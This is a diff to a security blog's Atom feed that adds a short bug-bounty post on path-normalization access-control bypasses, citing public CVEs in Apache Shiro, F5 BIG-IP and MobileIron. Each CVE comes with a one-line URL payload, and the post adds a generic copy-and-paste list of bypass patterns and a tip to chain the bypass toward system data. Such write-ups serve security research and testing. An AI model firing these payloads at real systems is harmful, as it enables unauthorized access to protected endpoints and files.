@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://k3mlol.github.io/"/>
-  <updated>2020-09-10T17:45:39.597Z</updated>
+  <updated>2020-09-14T13:16:47.865Z</updated>
   <id>https://k3mlol.github.io/</id>
   
   <author>
@@ -15,6 +15,33 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>acl-bypass-magic</title>
+    <link href="https://k3mlol.github.io/acl-bypass-magic/"/>
+    <id>https://k3mlol.github.io/acl-bypass-magic/</id>
+    <published>2020-09-14T08:57:35.000Z</published>
+    <updated>2020-09-14T13:16:47.865Z</updated>
+    
+    <content type="html"><![CDATA[<p>the fascination of web security is the single payload can help us hit in the heart of system.</p><p>orange talk about the acl bypass at BlackHat USA 2018. <a href="https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf" target="_blank" rel="noopener">click here enjoy his Presentation</a></p><p>What’s more, at one private bug bounty program, orange also use this vuln attack the internal service. I enjoy the report for more than ten times.<br><img src="/images/note/smile.gif" /></p><p>Yes, this is existed in the real word. But you need to guess the reverse proxy server services or you need to take the time to look the system document to guess(brute force) the restrict services.</p><h4 id="Apache-Shrio-CVE-2020-11989"><a href="#Apache-Shrio-CVE-2020-11989" class="headerlink" title="Apache Shrio(CVE-2020-11989)"></a>Apache Shrio(CVE-2020-11989)</h4><p>Apache Shiro before 1.5.3, when using Apache Shiro with Spring dynamic controllers, a specially crafted request may cause an authentication bypass.<br>payload</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/;/admin_endpoint</span><br></pre></td></tr></table></figure><h4 id="Apache-Shrio-CVE-2020-13933"><a href="#Apache-Shrio-CVE-2020-13933" class="headerlink" title="Apache Shrio(CVE-2020-13933)"></a>Apache Shrio(CVE-2020-13933)</h4><p>Apache Shiro before 1.6.0, when using Apache Shiro, a specially crafted HTTP request may cause an authentication bypass.</p><p>payload</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/test/%3badmin_endpoint</span><br></pre></td></tr></table></figure><h4 id="F5-BIG-IP-CVE-2020-5902"><a href="#F5-BIG-IP-CVE-2020-5902" class="headerlink" title="F5-BIG-IP(CVE-2020-5902)"></a>F5-BIG-IP(CVE-2020-5902)</h4><p>payload</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp</span><br></pre></td></tr></table></figure><h4 id="MobileIron-Authentication-Bypass-CVE-2020-15506"><a href="#MobileIron-Authentication-Bypass-CVE-2020-15506" class="headerlink" title="MobileIron Authentication Bypass (CVE-2020-15506)"></a>MobileIron Authentication Bypass (CVE-2020-15506)</h4><p>payload</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/mifs/.;/services/LogService</span><br></pre></td></tr></table></figure><p><a href="https://blog.orange.tw/2020/09/how-i-hacked-facebook-again-mobileiron-mdm-rce.html" target="_blank" rel="noopener">https://blog.orange.tw/2020/09/how-i-hacked-facebook-again-mobileiron-mdm-rce.html</a></p><hr><p>here we go, Let’s copy and paste the payload</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/..;/</span><br><span class="line">/;/</span><br><span class="line">/.;/</span><br><span class="line">/../</span><br></pre></td></tr></table></figure><p>bug bounty tips:<br>just a acl bypass vuln seems to be harmless, so I suggest you need to dig in to get the system data or chain other vulns.</p><h4 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h4><ul><li><a href="https://xlab.tencent.com/cn/2020/06/30/xlab-20-002/" target="_blank" rel="noopener">https://xlab.tencent.com/cn/2020/06/30/xlab-20-002/</a></li><li><a href="https://xz.aliyun.com/t/7964" target="_blank" rel="noopener">https://xz.aliyun.com/t/7964</a></li><li><a href="https://shiro.apache.org/security-reports.html" target="_blank" rel="noopener">https://shiro.apache.org/security-reports.html</a></li></ul>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;the fascination of web security is the single payload can help us hit in the heart of system.&lt;/p&gt;
+&lt;p&gt;orange talk about the acl bypass at 
+      
+    
+    </summary>
+    
+    
+    
+      <category term="java security" scheme="https://k3mlol.github.io/tags/java-security/"/>
+    
+      <category term="acl bypass" scheme="https://k3mlol.github.io/tags/acl-bypass/"/>
+    
+  </entry>
   
   <entry>
     <title>csrf is dead?</title>
